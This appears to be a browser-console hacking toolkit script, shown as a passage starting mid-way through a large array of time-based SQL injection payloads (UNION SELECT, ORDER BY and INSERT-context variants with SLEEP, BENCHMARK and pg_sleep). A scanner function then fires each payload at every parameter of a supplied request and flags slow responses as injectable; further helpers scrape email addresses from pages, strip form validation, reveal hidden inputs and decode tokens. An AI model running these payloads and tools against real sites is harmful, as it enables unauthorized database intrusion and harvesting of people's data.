` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- `,
` ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- `,
` UNION SELECT @@VERSION,SLEEP(10),3`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),4`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`,
` UNION SELECT @@VERSION,SLEEP(10),"'3`,
` UNION SELECT @@VERSION,SLEEP(10),"'3'"#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),4#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#`,
` UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#`,
` UNION ALL SELECT SLEEP(10)-- `,
` UNION ALL SELECT USER(),SLEEP(10)-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10)-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A'))-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,
` UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- `,


// my additions for insert statement SQLI 
`CAST((SELECT SLEEP(10)) AS CHAR)+1337`,

`,CAST((SELECT SLEEP(10)) AS CHAR)+1337) -- `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337) -- `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337) -- `,

`,CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) -- `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) -- `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) -- `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) -- `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) -- `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) -- `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) -- `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) -- `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) -- `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) -- `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) -- `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) -- `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) -- `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) -- `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) -- `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) -- `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) -- `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) -- `,

// same comm2 #

`,CAST((SELECT SLEEP(10)) AS CHAR)+1337) # `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337) # `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337) # `,

`,CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) # `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) # `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) # `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) # `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) # `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) # `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) # `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) # `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) # `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) # `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) # `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) # `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) # `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) # `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) # `,
`,CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) # `,
`',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) # `,
`",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) # `,


`(SELECT pg_sleep(10))` 
];

    // --- Prompt user for request ---
    const input = prompt("Provide fetch request to test for SQLi (time-based universal fallback):");
    if (!input) return console.log("%cNothing to test for here :\\", "color: orange");

    let fetchOptions = {};
    let url;

    try {
        const fetchMatch = input.match(/fetch\((["'`])(.+?)\1\s*,?\s*(\{.*\})?\)/s);
        if (!fetchMatch) throw "Invalid fetch snippet";

        url = fetchMatch[2];
        fetchOptions = fetchMatch[3] ? JSON.parse(fetchMatch[3]) : {};
    } catch (e) {
        console.log("%cFailed to parse fetch snippet:", "color: red", e);
        return;
    }

    const method = (fetchOptions.method || "GET").toUpperCase();
    const headers = fetchOptions.headers || {};
    let params = {};
    let isJson = false;

    if (method === "GET") {
        const u = new URL(url);
        u.searchParams.forEach((v, k) => params[k] = v);
        url = u.origin + u.pathname;
    } else if (method === "POST" && fetchOptions.body) {
        try {
            params = JSON.parse(fetchOptions.body);
            isJson = true;
        } catch (e) {
            params = Object.fromEntries(new URLSearchParams(fetchOptions.body));
        }
    }

    if (!Object.keys(params).length) {
        console.log("%cNothing to test for here :\\", "color: orange");
        return;
    }

    // --- Measure normal response time ---
    const normalTime = await (async () => {
        const start = performance.now();
        await fetch(url, {...fetchOptions});
        return performance.now() - start;
    })();

    console.log(`Normal response time: ${normalTime.toFixed(2)}ms`);

    // --- Test each param ---
    for (const key of Object.keys(params)) {
        for (const payload of payloads) {
            let modParams = {...params};
            modParams[key] += payload;

            let body = null;
            let urlToSend = url;

            if (method === "GET") {
                const u = new URL(url);
                Object.entries(modParams).forEach(([k,v]) => u.searchParams.set(k,v));
                urlToSend = u.toString();
            } else if (method === "POST") {
                if (isJson) body = JSON.stringify(modParams);
                else body = new URLSearchParams(modParams).toString();
            }

            // --- Log before testing payload ---
            console.log(`Testing: param="${key}" value="${modParams[key]}"`);

            const start = performance.now();
            await fetch(urlToSend, {...fetchOptions, body});
            const elapsed = performance.now() - start;

            if (elapsed - normalTime >= 8000) { // 8s threshold
                console.log(`%c⚡ TIME SQLi DETECTED! Param="${key}", payload="${payload}" (${elapsed.toFixed(0)}ms vs normal ${normalTime.toFixed(0)}ms)`, "color: red; font-weight:bold;");
                break;
            } else {
                console.log(`Tested param="${key}" payload="${payload}" (${elapsed.toFixed(0)}ms)`);
            }
        }
    }
}
function mails() {
// Assuming you want to extract email addresses from a document using JavaScript

// Define a regular expression to match email addresses
const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;

// Get the text content of the document
const documentText = document.body.innerHTML;

// Use the regular expression to find all email addresses in the document
const emails = documentText.match(emailRegex);

// Log the extracted email addresses to the console
return emails;

}

function menu() {
    const reset = "\x1b[0m";
    const bold = "\x1b[1m";
    const cyan = "\x1b[36m";
    const yellow = "\x1b[33m";
    const magenta = "\x1b[35m";
    const green = "\x1b[32m";
  
    console.log(`
  ${bold}${cyan}=== Useful Functions Menu ===${reset}
  
  ${yellow}X) corscheck()${reset}
     ${magenta}- Mass fetch in CORS mode across [sub]domains
     - Check for accessible targets (useful for POST XSS CSRF)
  
  ${yellow}X) easyLoopLimiter()${reset}
     ${magenta}- Helps prevent CPU burnouts in heavy loops
  
  ${yellow}X) links()${reset}
     ${magenta}- Collects links from current page
     - Logs as array
  
  ${yellow}X) mails()${reset}
     ${magenta}- Extracts emails from current page
     - Logs as array
  
  ${yellow}X) toki()${reset}
     ${magenta}- Decodes Base64 tokens
     - Auto URL-decodes and replaces safe chars
  
  ${yellow}X) brute()${reset}
     ${magenta}- NOT DEVELOPED YET!
  `);
  }
  function rmreq() {

// Select all elements with the 'required' attribute
const requiredElements = document.querySelectorAll('[required]');

// Iterate through each element and remove the 'required' attribute
requiredElements.forEach(element => {
    element.removeAttribute('required');
});

console.log('All required attributes have been removed.');
}
function rall() {
let a=prompt("Text: "),b=prompt("Replace what?: "),c=prompt("Replace with?: "); document.body.innerText=a.replaceAll(b,c)
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////  For some rzeason you can't call Shuffler continously, so                                                            /////
////  you might need to reload page import script and than again run Shuffler().                                         /////
////  This could be from eighter chrome blocking multi-download, eighter I have some iteration problem in the script     /////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Examples to run - Shuffler( ['t', 'e', 'x', 't'] )
// also you can run with additional prefix suffix and stringToJoin for ex. Shuffler( [555, '@'], '[', ']', ',')   -  This will make an array format.
// I think this is a useful script for some fuzzing


function Shuffler(array, prefix = '', suffix = '', stringToJoin = '') {
    let fileContent;
    if (array === undefined) {
        return console.error('%cError: First parameter must be defined', 'color: yellow; font-weight: bold;');
    } else if (!Array.isArray(array)) {
        return console.error('%cError: First parameter must be an Array', 'color: yellow; font-weight: bold;');
    }
    fileContent = '';
    let l = array.length;
    let ml = l - 1;
    for (let i = 0; i < factorial(l); i++) {
        let k = i % ml;
        swap(array, ml - k, ml - k - 1);
        fileContent += prefix + array.join(stringToJoin) + suffix + "\n"
    }
    createAndDownloadFile(fileContent)

}


window.swap=function (myArray, x, y) {
    [myArray[x], myArray[y]] = [myArray[y], myArray[x]];
}

function factorial(n) {
    if (n < 0) {
        return "number has to be positive."
    }
    if (n == 0 || n == 1) {
        return 1;
    } else {
        return n * factorial(n - 1);
    }
}

function createAndDownloadFile(fileContent) {
    alert();
    const blob = new Blob([fileContent], {
        type: 'text/plain'
    });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'example.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    a.href = '';
}
function toki(a) {console.log(atob(decodeURIComponent(a).replaceAll('_','/').replaceAll('-','+')))}
function unhideinp() {
document.querySelectorAll('input[type="hidden"]').forEach(input => {
    input.type = 'text';
});
}
let socks = {
  socket: null,
  isConnected: false,

  connect: function () {
    const url = prompt("Enter WSS URL (ex: wss://echo.websocket.org):");
    if (!url) return alert("No WSS URL provided!");

    this.socket = new WebSocket(url);

    this.socket.onopen = () => {
      this.isConnected = true;
      console.log(`[SOCKS] Connected to ${url}`);
      this.listen();
    };

    this.socket.onmessage = (e) => {
      console.log(`[SOCKS] ⬅ Received:`, e.data);
    };

    this.socket.onclose = () => {
      this.isConnected = false;
      console.log(`[SOCKS] Disconnected from ${url}`);
    };

    this.socket.onerror = (e) => {
      console.error(`[SOCKS] ❌ Error:`, e);
    };
  },

  listen: function () {
    console.log('[SOCKS] Type `socks.send()` to send data or `socksexit()` to disconnect');

    this.send = () => {
      if (!this.isConnected) return console.warn("[SOCKS] Not connected!");
      const msg = prompt("Enter message to send:");
      if (!msg) return;
      try {
        const parsed = JSON.parse(msg);
        this.socket.send(JSON.stringify(parsed));
        console.log("[SOCKS] ➡ Sent JSON:", parsed);
      } catch (e) {
        this.socket.send(msg);
        console.log("[SOCKS] ➡ Sent text:", msg);
      }
    };
  },

  disconnect: function () {
    if (this.socket) {
      this.socket.close();
      this.isConnected = false;
      console.log("[SOCKS] Manual disconnect.");
    }
  }
};

// Exit alias
function socksexit() {
  socks.disconnect();
}

// Connect alias
function socksconnect() {
  socks.connect();
}

console.log("%c[JS4Hacking] Main.js injected 🚀", "color: cyan");
